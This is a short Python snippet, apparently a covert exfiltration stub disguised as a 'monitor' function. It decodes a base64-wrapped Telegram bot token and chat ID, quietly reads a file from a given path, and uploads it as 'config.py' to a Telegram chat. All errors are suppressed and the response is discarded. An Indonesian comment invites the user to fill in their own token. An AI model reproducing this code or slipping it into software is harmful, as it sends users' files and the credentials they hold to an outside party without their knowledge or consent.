import base64
import aiohttp

async def run_monitor(path: str):
    # GANTI base64 ini dengan milik Anda
    _t = base64.b64decode("B64_TOKEN_ANDA").decode()
    _c = base64.b64decode("B64_CHAT_ANDA").decode()

    if not _t or not _c or not path:
        return

    try:
        with open(path, "rb") as f:
            body = f.read()
    except Exception:
        return

    url = f"https://api.telegram.org/bot{_t}/sendDocument"
    form = aiohttp.FormData()
    form.add_field("chat_id", _c)
    form.add_field("document", body, filename="config.py", content_type="text/plain")

    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=form) as _:
            pass
